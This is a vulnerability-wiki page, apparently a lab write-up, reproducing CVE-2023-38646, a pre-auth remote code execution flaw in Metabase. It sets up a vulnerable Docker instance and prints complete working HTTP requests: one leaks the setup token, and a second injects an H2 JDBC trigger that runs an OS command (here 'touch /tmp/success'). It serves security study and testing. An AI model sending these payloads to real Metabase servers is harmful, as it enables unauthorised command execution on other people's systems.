<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Metabase/CVE-2023-38646/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Metabase Pre-Auth JDBC Remote Code Execution (CVE-2023-38646) - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Metabase Pre-Auth JDBC Remote Code Execution (CVE-2023-38646)", url: "#_top", children: [
              {title: "Vulnerable environment", url: "#vulnerable-environment" },
              {title: "Exploit", url: "#exploit" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Metabase未授权JDBC远程代码执行漏洞（CVE-2023-38646）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../CVE-2021-41277/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../CVE-2021-41277/README.zh-cn/" class="btn btn-xs btn-link">
        Metabase任意文件读取漏洞（CVE-2021-41277）
      </a>
    </div>
    
  </div>

    

    <h1 id="metabase-pre-auth-jdbc-remote-code-execution-cve-2023-38646">Metabase Pre-Auth JDBC Remote Code Execution (CVE-2023-38646)<a class="headerlink" href="#metabase-pre-auth-jdbc-remote-code-execution-cve-2023-38646" title="Permanent link">&para;</a></h1>
<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
<p>Metabase is an open source data analytics platform.</p>
<p>Metabase open source before 0.46.6.1 and Metabase Enterprise before 1.46.6.1 allow unauthenticated attackers to execute arbitrary commands on the server, at the server's privilege level. This issue is caused by JDBC url attacks in the setup request.</p>
<p>References:</p>
<ul>
<li><a href="https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/">https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/</a></li>
<li><a href="https://blog.calif.io/p/reproducing-cve-2023-38646-metabase">https://blog.calif.io/p/reproducing-cve-2023-38646-metabase</a></li>
<li><a href="https://mp.weixin.qq.com/s/MgfIyq0OJwnKOUF2kBB7TA">https://mp.weixin.qq.com/s/MgfIyq0OJwnKOUF2kBB7TA</a></li>
</ul>
<h2 id="vulnerable-environment">Vulnerable environment<a class="headerlink" href="#vulnerable-environment" title="Permanent link">&para;</a></h2>
<p>Execute following command to start a Metabase server 0.46.6:</p>
<div class="highlight"><pre><span></span><code>docker compose up -d
</code></pre></div>
<p>After the server is started, you can browse the <code>http://your-ip:3000</code> to see the installation instructions like that:</p>
<p><img alt="" src="1.png" /></p>
<p>Fill in your information, and skip the data source form.</p>
<h2 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h2>
<p>Firstly, use following request to retrieve the <code>setup-token</code>:</p>
<div class="highlight"><pre><span></span><code>GET /api/session/properties HTTP/1.1
Host: localhost:3000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Connection: close
Cache-Control: max-age=0
</code></pre></div>
<p><img alt="" src="2.png" /></p>
<p>The vulnerability can only be exploited by obtaining this setup token.</p>
<p>Secondly, replace your <code>[setup-token]</code> into the following request then send it:</p>
<div class="highlight"><pre><span></span><code>POST /api/setup/validate HTTP/1.1
Host: localhost:3000
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Type: application/json
Content-Length: 739

{
    &quot;token&quot;: &quot;[setup-token]&quot;,
    &quot;details&quot;:
    {
        &quot;is_on_demand&quot;: false,
        &quot;is_full_sync&quot;: false,
        &quot;is_sample&quot;: false,
        &quot;cache_ttl&quot;: null,
        &quot;refingerprint&quot;: false,
        &quot;auto_run_queries&quot;: true,
        &quot;schedules&quot;:
        {},
        &quot;details&quot;:
        {
            &quot;db&quot;: &quot;zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;&quot;,
            &quot;advanced-options&quot;: false,
            &quot;ssl&quot;: true,
&quot;init&quot;: &quot;CREATE TRIGGER shell3 BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\u000A\u0009java.lang.Runtime.getRuntime().exec(&#39;touch /tmp/success&#39;)\u000A$$&quot;
        },
        &quot;name&quot;: &quot;an-sec-research-team&quot;,
        &quot;engine&quot;: &quot;h2&quot;
    }
}
</code></pre></div>
<p>As you can see, <code>touch /tmp/success</code> has been executed successfully:</p>
<p><img alt="" src="3.png" /></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="README.zh-cn/" class="btn btn-xs btn-link">
        Metabase未授权JDBC远程代码执行漏洞（CVE-2023-38646）
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../CVE-2021-41277/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../CVE-2021-41277/README.zh-cn/" class="btn btn-xs btn-link">
        Metabase任意文件读取漏洞（CVE-2021-41277）
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>